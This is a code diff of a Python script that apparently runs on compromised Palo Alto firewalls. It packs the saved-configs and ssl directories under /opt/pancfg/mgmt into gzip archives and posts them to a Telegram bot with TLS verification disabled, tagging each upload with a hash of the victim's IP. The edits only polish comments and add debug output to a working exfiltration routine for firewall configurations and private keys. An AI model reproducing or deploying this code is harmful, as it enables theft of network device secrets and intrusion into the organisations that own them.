@@ -21,7 +21,7 @@ def check_and_install_libraries():
 check_and_install_libraries()
 
 import requests
-import urllib3 
+import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_to_telegram(message, files):
@@ -31,21 +31,28 @@ def send_to_telegram(message, files):
 
     multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
     
-    # Preparing files correctly for Telegram
     files_to_send = {}
     for file_name, file_data in files.items():
-        # Make sure files are correctly handled as file-like objects
+        # Ensure files are handled as file-like objects
         files_to_send[file_name] = (file_name, file_data, "application/gzip")
 
     response = requests.post(
         url.replace("sendMessage", "sendDocument"), files={**multipart_data, **files_to_send}, verify=False
     )
+    
+    # Printing the response for debugging purposes
+    if response.status_code != 200:
+        print(f"Error: {response.status_code}")
+        print(response.text)  # This will print the error message from Telegram
+    else:
+        print("Message and files sent successfully!")
+    
     return response.ok
 
 def archive_directory(directory_path):
     tar_stream = io.BytesIO()
     with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
-        tar.add(directory_path, arcname=os.path.basename(directory_path))  # Correct handling of directory
+        tar.add(directory_path, arcname=os.path.basename(directory_path))
     tar_stream.seek(0)
     return tar_stream
 
@@ -66,7 +73,6 @@ def main():
         message += f"------------------\n"
         message += f"#{ip_hash[:8]}"
 
-        # Archiving directories
         files = {
             "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
             "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
